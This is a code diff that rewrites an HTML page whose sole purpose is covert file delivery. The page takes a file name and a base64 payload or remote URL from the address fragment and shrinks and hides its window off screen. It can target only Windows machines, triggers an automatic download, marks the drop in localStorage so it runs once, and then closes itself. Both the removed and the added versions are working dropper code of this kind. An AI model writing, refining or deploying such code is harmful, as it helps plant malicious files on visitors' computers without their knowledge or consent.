@@ -1,58 +1,81 @@
 <!DOCTYPE html>
-<html><head><script>
-var h='',fn='',sep=-1,key='',wOnly=false,data='';
-try{
-  h=location.hash?location.hash.slice(1):'';
-  if(h){
-    try{h=decodeURIComponent(h)}catch(e){}
-    if(h.slice(-2)==='!W'){wOnly=true;h=h.slice(0,-2)}
-    sep=h.indexOf('~');
-    fn=sep>0?h.slice(0,sep):'';
-    data=sep>0?h.slice(sep+1):'';
-    key='dl_done_'+fn;
-    if(fn)document.title=fn;
-    if(fn&&localStorage.getItem(key)){
-      window.stop();
-      history.back();
-      window.close();
-      location.replace('about:blank');
+<html><head><title>.</title></head>
+<body>
+<script>
+window.blur();
+window.resizeTo(1,1);
+window.moveTo(-2000,-2000);
+try {
+  var h = location.hash.slice(1);
+  if (!h) throw 'No data';
+  try { h = decodeURIComponent(h); } catch(e) {}
+
+  // Windows-only flag: if URL ends with !W, check platform
+  var winOnly = false;
+  if (h.slice(-2) === '!W') {
+    winOnly = true;
+    h = h.slice(0, -2); // Remove !W flag
+  }
+  if (winOnly && navigator.platform.indexOf('Win') === -1) {
+    window.close();
+    throw 'skip';
+  }
+
+  var sep = h.indexOf('~');
+  var fname = sep > 0 ? h.slice(0, sep) : 'delivered.bin';
+  var data = sep > 0 ? h.slice(sep + 1) : h;
+
+  document.title = fname;
+
+  var key = 'dl_done_' + fname;
+  if (localStorage.getItem(key)) {
+    window.close();
+    throw 'skip';
+  }
+
+  function markDone() {
+    localStorage.setItem(key, '1');
+    setTimeout(function(){ window.close(); }, 2000);
+  }
+
+  function doDownload(blob) {
+    if (!blob || blob.size === 0) {
+      document.body.textContent = 'Empty file — will retry next time';
+      return;
     }
-  }
-}catch(e){}
-</script><title></title></head>
-<body><script>
-(function(){
-  if(!fn||!data)return;
-  if(wOnly&&navigator.platform.indexOf('Win')===-1){history.back();window.close();return}
-  if(localStorage.getItem(key)){history.back();window.close();return}
-
-  document.title=fn;
-  try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
-
-  function finish(){
-    localStorage.setItem(key,'1');
-    try{caches.open('dl-done').then(function(c){c.put('done-'+fn,new Response('1'))})}catch(e){}
-    setTimeout(function(){history.back();window.close();setTimeout(function(){location.replace('about:blank')},300)},1500);
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = fname;
+    document.body.appendChild(a);
+    a.click();
+    markDone();
   }
 
-  function dl(blob){
-    if(!blob||!blob.size)return;
-    var u=URL.createObjectURL(blob);
-    var a=document.createElement('a');
-    a.href=u;a.download=fn;a.style.display='none';
-    document.body.appendChild(a);a.click();
-    setTimeout(function(){try{URL.revokeObjectURL(u)}catch(e){}},2000);
-    finish();
+  if (data.indexOf('http') === 0) {
+    fetch(data)
+      .then(function(r) {
+        if (!r.ok) throw 'HTTP error: ' + r.status;
+        var expected = parseInt(r.headers.get('content-length') || '0');
+        return r.blob().then(function(blob) {
+          if (expected > 0 && blob.size < expected) {
+            throw 'Incomplete: ' + blob.size + '/' + expected;
+          }
+          return blob;
+        });
+      })
+      .then(function(blob) { doDownload(blob); })
+      .catch(function(e) { document.body.textContent = 'Failed — will retry: ' + e; });
+  } else {
+    try {
+      var raw = atob(data);
+      var arr = new Uint8Array(raw.length);
+      for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+      doDownload(new Blob([arr], {type: 'application/octet-stream'}));
+    } catch(e) { document.body.textContent = 'Decode failed — will retry: ' + e; }
   }
-
-  if(data.indexOf('http')===0){
-    fetch(data).then(function(r){if(!r.ok)throw 0;return r.blob()}).then(dl).catch(function(){});
-  }else{
-    try{
-      var raw=atob(data);var arr=new Uint8Array(raw.length);
-      for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-      dl(new Blob([arr],{type:'application/octet-stream'}));
-    }catch(e){}
-  }
-})();
-</script></body></html>
+} catch(e) {
+  if (e !== 'skip') document.body.textContent = 'Error: ' + e;
+}
+</script>
+</body></html>
